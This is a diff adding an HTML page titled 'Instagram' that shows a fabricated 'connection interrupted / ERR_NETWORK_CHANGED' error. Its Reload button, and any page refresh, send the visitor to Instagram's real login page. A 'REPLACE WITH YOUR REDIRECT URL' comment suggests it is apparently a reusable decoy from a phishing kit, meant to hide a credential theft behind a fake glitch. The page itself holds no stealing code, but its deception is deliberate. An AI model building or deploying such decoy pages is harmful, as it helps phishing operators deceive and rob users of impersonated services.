@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 100px 40px 40px;
+        }
+
+        .error-icon {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 40px;
+            border: 2px solid #888;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: #888;
+        }
+
+        .error-title {
+            color: #888;
+            font-size: 20px;
+            margin-bottom: 15px;
+            font-weight: normal;
+            text-align: center;
+        }
+
+        .error-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .error-code {
+            color: #555;
+            font-size: 12px;
+            font-family: monospace;
+            margin-bottom: auto;
+        }
+
+        .reload-btn {
+            width: 100%;
+            max-width: 350px;
+            padding: 16px;
+            background: #7cb3ff;
+            color: #000;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 40px;
+        }
+
+        .reload-btn:hover {
+            background: #5a9eff;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="error-icon">⚠️</div>
+    <h1 class="error-title">Your connection was interrupted</h1>
+    <p class="error-text">A network change was detected.</p>
+    <p class="error-code">ERR_NETWORK_CHANGED</p>
+    <button class="reload-btn" onclick="goToSite()">Reload</button>
+
+    <script>
+        // REPLACE WITH YOUR REDIRECT URL
+        const REDIRECT_URL = 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav&hl=en';
+
+        // If user refreshes this page, redirect to real site
+        if (performance.navigation.type === 1) {
+            // Page was refreshed
+            window.location.href = REDIRECT_URL;
+        }
+
+        function goToSite() {
+            window.location.href = REDIRECT_URL;
+        }
+
+        // Alternative refresh detection for modern browsers
+        if (window.performance && window.performance.getEntriesByType) {
+            var navigationEntries = window.performance.getEntriesByType('navigation');
+            if (navigationEntries.length > 0 && navigationEntries[0].type === 'reload') {
+                window.location.href = REDIRECT_URL;
+            }
+        }
+    </script>
+
+</body>
+</html>
